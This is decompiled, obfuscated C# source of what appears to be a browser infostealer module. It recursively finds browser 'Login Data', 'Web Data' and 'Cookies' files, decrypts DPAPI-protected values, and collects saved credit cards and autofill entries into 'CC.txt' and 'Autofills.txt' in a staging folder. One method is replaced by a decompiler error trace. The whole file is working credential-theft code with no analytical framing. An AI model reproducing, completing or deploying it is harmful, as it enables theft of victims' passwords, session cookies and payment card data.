using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using ns14;
using ns39;

namespace ns38
{
	// Token: 0x0200003C RID: 60
	internal class Class25
	{
		// Token: 0x0600020C RID: 524 RVA: 0x0000FF08 File Offset: 0x0000E108
		public static string smethod_1(byte[] byte_0, DataProtectionScope dataProtectionScope_0, byte[] byte_1 = null)
		{
			string result;
			try
			{
				if (byte_0 != null && byte_0.Length != 0)
				{
					byte[] bytes = ProtectedData.Unprotect(byte_0, byte_1, dataProtectionScope_0);
					result = Encoding.UTF8.GetString(bytes);
				}
				else
				{
					result = string.Empty;
				}
			}
			catch (CryptographicException)
			{
				result = string.Empty;
			}
			catch
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x0600020D RID: 525 RVA: 0x0000FF6C File Offset: 0x0000E16C
		public static string smethod_2()
		{
			return Path.Combine(new string[]
			{
				Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp", "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode().ToString() + Thread.CurrentThread.ManagedThreadId.ToString())
			});
		}

		// Token: 0x0600020E RID: 526 RVA: 0x0000FFF4 File Offset: 0x0000E1F4
		public static List<string> smethod_4(string string_0, int int_1 = 4, int int_2 = 1, params string[] string_1)
		{
			List<string> list = new List<string>();
			if (string_1 != null && string_1.Length != 0 && int_2 <= int_1)
			{
				List<string> result;
				try
				{
					foreach (string path in Directory.GetDirectories(string_0))
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							FileInfo[] files = directoryInfo.GetFiles();
							bool flag = false;
							int num = 0;
							while (num < files.Length && !flag)
							{
								int num2 = 0;
								while (num2 < string_1.Length && !flag)
								{
									string a = string_1[num2];
									FileInfo fileInfo = files[num];
									if (a == fileInfo.Name)
									{
										flag = true;
										list.Add(fileInfo.FullName);
									}
									num2++;
								}
								num++;
							}
							foreach (string item in Class25.smethod_4(directoryInfo.FullName, int_1, int_2 + 1, string_1))
							{
								if (!list.Contains(item))
								{
									list.Add(item);
								}
							}
						}
						catch
						{
						}
					}
					result = list;
				}
				catch
				{
					result = list;
				}
				return result;
			}
			return list;
		}

		// Token: 0x0600020F RID: 527 RVA: 0x00010134 File Offset: 0x0000E334
		private static List<string> smethod_5()
		{
			List<string> list = new List<string>();
			List<string> result;
			try
			{
				list.AddRange(Class25.smethod_4(GClass9.string_2, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
				list.AddRange(Class25.smethod_4(GClass9.string_1, 4, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}));
				result = list;
			}
			catch
			{
				result = list;
			}
			return result;
		}

		// Token: 0x06000210 RID: 528 RVA: 0x000101F4 File Offset: 0x0000E3F4
		public static void smethod_6(string string_0)
		{
			/*
An exception occurred when decompiling this method (06000210)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void ns38.Class25::smethod_6(System.String)
 ---> System.Exception: Inconsistent stack size at IL_127
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 443
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 269
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 112
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 88
   --- Конец трассировки внутреннего стека исключений ---
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 92
   в ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:строка 1533
*/;
		}

		// Token: 0x06000211 RID: 529 RVA: 0x00010368 File Offset: 0x0000E568
		private static string smethod_7(string string_0)
		{
			try
			{
				return string_0.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries)[0];
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000212 RID: 530 RVA: 0x000103E0 File Offset: 0x0000E5E0
		private static string smethod_8(string string_0)
		{
			try
			{
				string[] array = string_0.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[0] + "_" + array[1];
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000213 RID: 531 RVA: 0x0001046C File Offset: 0x0000E66C
		public static void smethod_9()
		{
			foreach (string text in Class25.smethod_5())
			{
				string fullName = new FileInfo(text).Directory.FullName;
				string string_ = text.Contains(GClass9.string_2) ? Class25.smethod_7(fullName) : Class25.smethod_8(fullName);
				string fullName2 = new FileInfo(text).Directory.FullName;
				Class25.smethod_6(fullName);
				Class26.smethod_0(fullName, string_);
			}
			string text2 = "";
			string text3 = "";
			foreach (string str in Class26.list_0)
			{
				text3 += str;
			}
			foreach (string str2 in Class25.list_0)
			{
				text2 = text2 + Environment.NewLine + str2;
			}
			if (!Directory.Exists(GClass9.string_6 + "\\Browsers"))
			{
				Directory.CreateDirectory(GClass9.string_6 + "\\Browsers");
			}
			if (text2 != "")
			{
				File.WriteAllText(GClass9.string_6 + "\\Browsers\\CC.txt", text2, Encoding.Default);
			}
			if (text3 != "")
			{
				File.WriteAllText(GClass9.string_6 + "\\Browsers\\Autofills.txt", text3, Encoding.Default);
			}
		}

		// Token: 0x040000E6 RID: 230
		public static int int_0;

		// Token: 0x040000E7 RID: 231
		public static List<string> list_0 = new List<string>();
	}
}
